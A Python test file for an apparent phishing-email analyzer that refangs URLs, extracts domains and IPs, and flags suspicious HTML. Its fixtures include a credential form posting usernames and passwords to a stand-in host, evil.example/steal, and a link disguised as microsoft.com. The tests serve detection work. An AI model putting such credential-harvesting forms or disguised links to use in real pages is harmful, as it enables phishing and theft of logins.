from app.iocs import html_checks, extract_domains_and_ips, extract_urls, refang


def test_refang():
    assert refang("hxxp://evil.example/payload") == "http://evil.example/payload"
    assert refang("hXXps://evil.example") == "https://evil.example"


def test_extract_urls_plain_and_defanged():
    text = "Visit hxxp://bad.example/login or https://ok.example/x and www.foo.example"
    urls = extract_urls(text)
    assert "http://bad.example/login" in urls
    assert "https://ok.example/x" in urls
    assert "http://www.foo.example" in urls


def test_extract_domains_and_ips():
    text = "Contact admin@evil-example.net or 8.8.228.1 for help. Internal 10.0.0.1 ignored."
    res = extract_domains_and_ips(text)
    assert "evil-example.net" in res["domains"]
    assert "8.8.228.1" in res["ips"]
    assert "10.0.0.1" not in res["ips"]


def test_html_credential_form_external_action():
    html = """
    <html><body>
    <form action="http://evil.example/steal">
      <input type="text" name="user"><input type="password" name="pass">
    </form></body></html>
    """
    res = html_checks(html)
    sev_title = [(f.severity.value, f.title) for f in res["findings"]]
    assert any(t == "Credential form in email" for _, t in sev_title)
    assert any(s == "high" for s, _ in sev_title)


def test_html_link_text_mismatch():
    html = '<a href="http://evil.example">https://microsoft.com</a>'
    res = html_checks(html)
    assert any(f.title == "Link text does not match target" for f in res["findings"])


def test_clean_html_no_findings():
    res = html_checks("<p>Hello, plain newsletter content.</p>")
    assert res["findings"] == []
